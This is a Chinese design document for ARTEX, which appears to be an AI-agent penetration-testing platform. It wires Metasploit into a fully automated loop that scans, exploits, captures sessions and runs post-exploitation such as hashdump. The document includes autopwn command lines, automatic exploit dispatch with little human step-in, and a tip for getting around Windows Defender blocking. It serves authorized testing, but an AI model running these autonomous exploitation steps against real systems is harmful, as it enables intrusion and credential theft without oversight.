# Metasploit 全自动闭环（msf + autopwn）

本页说明 ARTEX 如何把 Metasploit 接进 Worker，并把「资产 → 漏洞 → 模块 → 参数 → 执行 → 会话 → 取证」
串成可复现的闭环。

**没有 MCP，也没有 Python。** ARTEX 用自带的 `msfrpc` 包直接跟 `msfrpcd` 说 Metasploit 自己的
MessagePack-RPC（`POST /api/`，`Content-Type: binary/message-pack`）。`pymetasploit3` /
`mcp-pymetasploit3` / `fastmcp` / 系统解释器都与本闭环无关——二进制自包含，离线可用。

```
┌──────────────── ARTEX Worker / autopwn ────────────────┐
│ 1. msf_plan / autopwn 扫描   决策与侦察（纯 Go、无网络依赖）│
│ 2. msf_execute / autopwn_run 执行候选链                   │
│ 3. 会话 → 自动取证 → 写回 fact                            │
└───────────────┬────────────────────────────────────────┘
                │ msfrpc（MessagePack over HTTP）
        ┌───────▼────────┐
        │ msfrpcd (55553)│  ← ARTEX 可自动拉起（随机密码、仅 loopback）
        └───────┬────────┘
                │
        Metasploit Framework
```

## 1. 接入与启动（零人工）

### 1.1 Metasploit RPC：ARTEX 自己拉起

**不需要手工执行 `msfrpcd`**。ARTEX 启动时会：

1. 探测 `127.0.0.1:55553`；已有外部 msfrpcd 就直接复用（`managed=false`）。
2. 没有则定位 `msfrpcd`（PATH / `METASPLOIT_ROOT` / `C:\metasploit-framework\bin`），
   生成 32 位随机密码并写入 `settings.msf_rpc_password`，以
   `msfrpcd -P <pw> -p 55553 -S -n -a 127.0.0.1` 启动（仅 loopback、明文）。
3. 最多等 90s 等 RPC 就绪；失败只记日志，不阻塞 ARTEX 启动。
4. ARTEX 退出时回收自己启动的进程（外部复用不动）。

可用环境变量微调：`ARTEX_MSF_AUTOSTART=0` 关闭自动启动、`ARTEX_MSF_RPC_PORT` 改端口、
`ARTEX_MSF_RPC_ADDR` 改地址、`ARTEX_MSF_RPC_PASSWORD` 指定密码。

### 1.2 协议实现：`msfrpc/`

| 文件 | 内容 |
|---|---|
| `msfrpc/msgpack.go` | MessagePack 编解码（无第三方依赖；含 msfrpcd 真实报文回归用例） |
| `msfrpc/client.go` | `POST /api/` 客户端：`auth.login`、`core.version`、`module.info/execute`、`console.*`、`session.*` |
| `msfrpc/console.go` | `RunConsole`：建 console → 写脚本 → 轮询读回，是"跑带任意参数的模块"的唯一可靠方式 |

要点：

- msfrpcd 的返回里 **键和值都是 bin（0xc4）而不是 str**（Ruby 的 msgpack 习惯），解码器把
  `[]byte` 键归一成字符串；否则 `result`/`token` 全部取不到。
- TLS 是自签名证书，`InsecureSkipVerify` + `ARTEX_MSF_RPC_SSL=true|false|auto` 控制；
  ARTEX 自己拉起的实例用 `-S`（明文、仅 loopback），`auto` 会两种都试。
- 认证用 `auth.login` 返回的一次性 token，不额外生成永久 token。

### 1.3 RPC 密码

`msf_execute` / `autopwn_run` 按以下顺序取密码：

1. 入参 `rpc_password`
2. 环境变量 `ARTEX_MSF_RPC_PASSWORD`
3. 设置项 `msf_rpc_password`（自动启动时生成并写入）
4. 受管进程内存中的密码

密码不会写进日志。

## 2. 决策层（`msf/`）

决策是**纯函数**：同一输入永远得到同一 `plan_id`、同一候选顺序、同一分支。

`vuln_class`（类别/产品/CVE 自由文本，内部归一化）、`host`、`port`、`service`、`url`、
`lhost`/`lport`。覆盖：struts2、log4j、weblogic、tomcat、spring、jenkins、shiro、activemq、
solr、confluence、eternalblue(MS17-010)、bluekeep(CVE-2019-0708)、vsftpd、redis、ssh/mysql/mssql/smb
口令类。未命中内置类目时返回 `kind=search` + `suggested_search`，要求先检索，**不猜模块名**。

失败分支（`msf_next`，确定性）：

| 观察结果 | 动作 | 语义 |
|---|---|---|
| `session` | `session` | 拿到会话 → 已自动取证并写回 fact |
| `module_missing` | `retry` | 当前 MSF 没有该模块 → 下一候选 |
| `precheck_failed` | `degrade` | 前置条件不满足 → 转 check/辅助验证，写否定 fact |
| `no_session` | `retry` | 模块跑完无会话 → 下一候选 |
| `error` | `retry` | RPC/模块报错 → 下一候选 |
| 候选耗尽 | `stop` | 写否定 fact（模块+参数+原因），禁止重复同一路径 |

## 3. 工具契约

| 工具 | 读 | 作用 |
|---|---|---|
| `msf_plan` | ✅ | 只读决策：候选模块、参数、前置条件、分支、取证步骤 |
| `msf_next` | ✅ | 无状态分支选择：同一目标 + `attempt` + `outcome` → 下一步动作 |
| `msf_execute` | ❌ | 已知漏洞的候选链执行：modules → console → 轮询会话 → 取证 → fact |
| `autopwn_run` | ❌ | **全自动闭环**：扫描 → 识别 → 匹配 → 利用 → 取证 → 后渗透，一次调用跑完一批目标 |

硬边界：

- **scope 门**：`msf_execute` 越界只记日志（沿用历史行为）；`autopwn_run` 对**越界目标直接拒绝**——
  它会在一批目标上连续动作，不能"先跑再看"。
- `msf_execute` / `autopwn_run` 只在**漏洞已确认**或**已授权侦察**之后调用。
- 每轮默认最多试 3 个候选（上限 8），等待会话默认 25s（上限 120s）。
- 执行结果（含失败）都要写回 fact，形成可审计链路。

## 4. 全自动闭环 `autopwn`（0.3.28）

### 4.1 七个阶段

1. **端口扫描**：并发 TCP connect（默认 23 个常见端口，可 `-ports 1-1024,8080`）。
2. **服务识别**：读 banner（FTP/SSH/SMTP/MySQL 主动问候）、Web 端口发 `HEAD`、Redis 发 `PING`、
   HTTPS 走 TLS；banner → 产品/版本归一（`vsftpd 2.3.4`、`tomcat`、`struts2`、`jenkins`…）。
3. **规则匹配**：`autopwn/rules`（`Rules` 表）把「端口 + 产品」映射到决策层 class，再交给 `msf.Build`
   产出候选模块、参数、置信度；同一扫描结果永远得到同一顺序。**扫描端口会被强制写回 `RPORT`**
   （非标准端口不会被模块按默认 21/80 打偏）。
4. **模块执行**：先 `module.info` 校验模块存在（缺失 → `module_missing`，换下一候选），
   再在 console 里 `use` → `set` → `run -j`。
5. **会话判定**：轮询 `session.list` 取差集；拿到会话即停。
6. **自动取证**：对新会话执行 `whoami` / `hostname`（shell 补 CRLF、meterpreter 走 write/read），
   证据原文进结果与 fact。
7. **后渗透**：`post/multi/gather/env`、`post/multi/recon/local_exploit_suggester`；
   meterpreter 会话追加 `post/windows/gather/hashdump`。模块缺失/报错只记录，不重试。

### 4.2 两种用法

**命令行（一键）**：

```bash
# 自动拉起 msfrpcd（端口不通时）→ 登录 → 扫描 → 利用 → 取证 → 后渗透
artex autopwn -targets 10.0.0.5,10.0.0.6 -ports 21,22,80,445 -lhost 10.0.0.1

# 只侦察与规划，不碰模块
artex autopwn -targets 10.0.0.5 -dry-run -json out.json

# 复用外部 msfrpcd
artex autopwn -targets 10.0.0.5 -msf-host 127.0.0.1 -msf-port 55553 -msf-pass *** -msf-ssl=false
```

退出码：`0` 有会话（或 `-dry-run`）、`1` 跑完但没拿到会话、`2` 连接/认证/参数失败。
`-json` 给出逐目标 `ports / candidates / attempts / sessions / post` 全量结果，可直接进报告。

**Worker 工具**：

```json
{"targets": ["10.0.0.5"], "ports": "1-1024,8080", "lhost": "10.0.0.1",
 "max_exploits": 3, "post": true, "dry_run": false}
```

拿到会话后会自动写一条 `confidence=confirmed` 的 fact（含 session id、目标、证据），
即使模型没有补发一轮也不会丢证据。

### 4.3 自动派单

- 验证器（`record_finding_check_result` → `verified`）把漏洞置为 confirmed 时，服务端回调
  `OnFindingConfirmed` → `msfAutoKick`；人工在 UI 改 confirmed 也走同一条路。
- `msfAutoKick` 直接向 frontier 下发高优先级意图（origin=`msf`），worker 池直接领取；
  同一漏洞已有 open/running 意图时跳过；写意图失败退回 hint，不会静默丢闭环。
- worker 调 `msf_plan` → `msf_execute`；没有确定性模块的类别转 `exploit_author` 写真实 exp。

## 4.4 单文件发行：内置便携 Ruby + Metasploit（0.3.29）

前面几节假定机器上已经装了 Metasploit。要让**一台干净机器**只靠一个 `artex.exe` 就能跑闭环，
就需要把运行时一起带上——ARTEX 的做法是把「便携 Ruby + Metasploit framework + 预装 gems」
压成 `runtime.zip`，作为 **trailer** 追加到 exe 尾部（不占编译期内存），运行时自解压：

```text
artex-full.exe
├── Go 主程序
└── [trailer] runtime.zip   ← embedded\bin\ruby.exe + embedded\framework\* + LICENSES\

首次使用：
  %LOCALAPPDATA%\ARTEX\runtime\<payload-hash>\
     ├── embedded\bin\ruby.exe
     ├── embedded\framework\msfrpcd + lib + modules + data
     ├── LICENSES\
     └── msfrpcd.log
```

要点：

- **内容寻址**：目录名是 payload 的 SHA-256 前 8 字节；换了运行时就是新目录，同一份运行时
  重复运行只认 `.ready` 版本戳，不会重复解压。
- **防 zip-slip**：解压前校验每个条目都在目标目录内；先解到 `<hash>.tmp-<pid>` 再 `rename`，
  解到一半失败不会留下半个运行时。
- **Windows 长路径**：解压时自动加 `\\?\` 前缀（Metasploit 的 modules 路径很容易超过 260）。
- **不走 cmd.exe**：`ruby.exe msfrpcd ... -U -P -p -S -n -f -a` 直接 exec，密码里的
  `!`/`&`/`^` 不会被命令行层吃掉；`-f` 保证我们启动的进程就是我们能停掉的进程。
- **后端选择**：`ARTEX_MSF_BACKEND=auto|external|embedded`（默认 auto：复用已监听 → 本地安装 →
  内置自解压）。ARTEX 服务端在找不到本地 Metasploit 时也会自动走内置运行时。
- **额外开关**：`ARTEX_MSF_RUNTIME_DIR` 改解压根目录、`ARTEX_MSF_RUNTIME_ZIP` 直接用本地
  zip（开发调试用，免重新出包）。

构建（两条命令）：

```powershell
pwsh -File scripts\build-runtime.ps1        # 从本机 C:\metasploit-framework 组装 msfrt\runtime.zip
pwsh -File scripts\append-payload.ps1       # 追加到 artex.exe 尾部 → artex-full.exe
# 或一条龙：
pwsh -File scripts\build-singlefile.ps1
```

实测（本机 Metasploit 6.4.107-dev，Windows 11）：`embedded` 约 700 MB → `runtime.zip` 约 250 MB，
单文件 `artex-full.exe` ≈ 300 MB；首次运行解压 40–90 s + `msfrpcd` 冷启动 20–60 s，
之后每次启动只做一次目录检查。

> 体积提示：运行时是 Metasploit 本体（便携 Ruby + 全量 modules/payloads），压不到几十 MB。
> 只要协议层最小化、不带框架时，用 0.3.27 起的纯 `msfrpc` 模式即可（需要机器上已有 Metasploit）。

## 5. 验证方法

```bash
go test ./msfrpc ./autopwn -count=1          # 编解码、RPC 客户端、扫描/匹配/引擎
go test ./server -run 'TestScope|TestDiff' -count=1
```

已实测（本机 Metasploit 6.4.107-dev，Windows）：

```
$ artex autopwn -targets 127.0.0.1 -ports 2121 -dry-run
[+] [127.0.0.1] 开放：2121/ftp(vsftpd 2.3.4)
[+] [127.0.0.1] 候选 1 个（按置信度）：exploit/unix/ftp/vsftpd_234_backdoor

$ artex autopwn -targets 127.0.0.1 -ports 2121      # 对假 FTP banner 实测
[*] 尝试 exploit/unix/ftp/vsftpd_234_backdoor（vsftpd-2.3.4-backdoor，端口 2121）
RHOSTS => 127.0.0.1   RPORT => 2121   PAYLOAD => cmd/unix/interact
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
```

（假服务不可利用，属预期"无会话"分支；`session → 取证 → 后渗透` 分支由
`autopwn/engine_test.go` 的 fake MSF 用例覆盖。）

## 6. 限制与注意事项

- **模块路径随 MSF 版本变动**；执行前 `module.info` 校验，缺失走 `module_missing`。
- **反弹 payload 需要目标能回连 `LHOST`**；内网场景先建隧道再给平台可达地址。
- **Web 载体类模块**不写死 Linux meterpreter payload，交给 MSF 按 target 自选。
- **高交互/加固目标**可能「check 通但拿不到会话」，按 `degrade` 写否定结论，不无限重试。
- **凭据类路径**（ssh/mysql 弱口令、smb 登录）需要字典或已知凭据，autopwn 不盲目爆破；
  交给 `msf_plan` + 显式参数。
- **console 是唯一可靠通道**：`module.execute` 只接受 RHOSTS/RPORT/PAYLOAD/LHOST/LPORT，
  `TARGETURI`/`SSL` 等会丢；只有 console 不可用时才退回 `module.execute`。
- **`msfrpcd` 的密码不要带 cmd 元字符**（`!`/`&`/`|`/`^`）。通过 `.bat` 拉起时会被 cmd 解释，
  导致「密码明明对却 Login Failed」。ARTEX 自动生成的密码是纯 hex，安全。
- **自动拉起 msfrpcd 受宿主环境影响**：实测把 `artex.exe` 放在 `C:\Users\...\Downloads\` 下时，
  Windows Defender/ASR 会拦截它创建 `ruby.exe` 子进程——表现是 `msfrpcd 启动后立即退出（exit=1）`
  且日志为空；同一份二进制复制到 `%TEMP%` 或 `C:\artex` 后 20s 内正常就绪。遇到该报错先换目录，
  或先手工起 `msfrpcd` 再用 `-msf-pass` 复用。
- 该闭环默认不走 ARTEX 的 `reverse_listen`/penelope；MSF 会话由 Metasploit 托管。
- 合规：仅对授权目标使用；`autopwn_run` 受任务 scope 硬校验。
